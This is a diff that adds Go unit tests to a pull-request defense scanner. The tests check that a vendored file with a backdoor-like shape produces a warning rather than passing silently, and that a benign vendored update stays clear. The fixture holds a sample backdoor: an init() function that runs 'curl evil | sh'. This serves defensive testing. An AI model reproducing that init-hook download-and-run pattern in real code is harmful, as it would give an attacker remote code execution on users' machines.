@@ -126,6 +126,68 @@ func TestScan_LongLineDoesNotHideExfilHit(t *testing.T) {
 	assert.Equal(t, prdefense.VerdictBlock, rep.Verdict)
 }
 
+// TestScan_VendoredBehavioralBackdoor_WarnsNotSilent pins the fix for the
+// AST blind spot: a malicious-shape source file (init() + exec = 2 concern
+// features) placed under a vendored/build-output path must NOT silently
+// clear. The identical file outside an excluded tree BLOCKs via the AST
+// arm; under vendor/ the concern is routed to WARN (not BLOCK — we cannot
+// structurally tell a malicious vendored injection from a benign vendored
+// bump that trips the heuristic, so the reviewer decides) and the path is
+// surfaced, never silently dropped.
+func TestScan_VendoredBehavioralBackdoor_WarnsNotSilent(t *testing.T) {
+	t.Parallel()
+
+	mal := "package x\n\nimport \"os/exec\"\n\nfunc init() { _ = exec.Command(\"sh\", \"-c\", \"curl evil | sh\") }\n"
+	scan := func(path string) prdefense.Report {
+		src := fakeProvider{content: map[string][]byte{path: []byte(mal)}}
+		rep, err := prdefense.Scan(context.Background(), src, "sha",
+			[]prdefense.ChangedFile{{Path: path, Status: "added"}})
+		require.NoError(t, err)
+		return rep
+	}
+
+	// Baseline: the same shape in a normal path BLOCKs via the AST arm.
+	blocked := scan("internal/loader.go")
+	assert.Equal(t, prdefense.VerdictBlock, blocked.Verdict)
+	require.Len(t, blocked.ASTConcerns, 1)
+
+	// Under vendor/: WARN (not clear, not block); the concern is routed to
+	// the excluded-tree bucket (never the block arm); the path is surfaced;
+	// the bytes were still read + exfil/content-scanned (Scanned==1).
+	ven := scan("vendor/github.com/evil/pkg/loader.go")
+	assert.Equal(t, prdefense.VerdictWarn, ven.Verdict, "must warn, not silently clear")
+	assert.Empty(t, ven.ASTConcerns, "an excluded-tree concern must not feed the block arm")
+	require.Len(t, ven.ExcludedTreeConcerns, 1)
+	assert.Equal(t, "go", ven.ExcludedTreeConcerns[0].Language)
+	assert.Contains(t, ven.ExcludedTreeConcerns[0].Concern.ConcerningFeatures, "exec_calls")
+	assert.Contains(t, ven.ExcludedTreeSources, "vendor/github.com/evil/pkg/loader.go")
+	assert.Equal(t, 1, ven.Scanned, "only the block-tier AST routing differs; the file is still scanned")
+	assert.Contains(t, ven.Reasons, "behavioral concern in vendored/generated go file(s)")
+}
+
+// TestScan_BenignVendoredBump_NoFalseWarn guards the other side of the
+// trade-off: an ordinary vendored source file (no concern features) must
+// NOT escalate the verdict. Auto-warning on every vendored file would
+// drown the warn tier on legitimate `go mod vendor` bumps, and an
+// auto-block would risk falsely burning an honest author. The path is
+// surfaced (informational), but the verdict stays clear.
+func TestScan_BenignVendoredBump_NoFalseWarn(t *testing.T) {
+	t.Parallel()
+
+	benign := "package foo\n\nfunc Bar() int { return 41 + 1 }\n"
+	path := "vendor/github.com/acme/foo/foo.go"
+	src := fakeProvider{content: map[string][]byte{path: []byte(benign)}}
+	rep, err := prdefense.Scan(context.Background(), src, "sha",
+		[]prdefense.ChangedFile{{Path: path, Status: "modified"}})
+	require.NoError(t, err)
+
+	assert.Equal(t, prdefense.VerdictClear, rep.Verdict, "a benign vendored bump must not warn or block")
+	assert.Empty(t, rep.ExcludedTreeConcerns)
+	assert.Empty(t, rep.ASTConcerns)
+	assert.Contains(t, rep.ExcludedTreeSources, path, "surfaced (informational) even when the verdict is clear")
+	assert.Equal(t, 1, rep.Scanned)
+}
+
 func TestScan_ClearOnBenignChangelist(t *testing.T) {
 	t.Parallel()
 
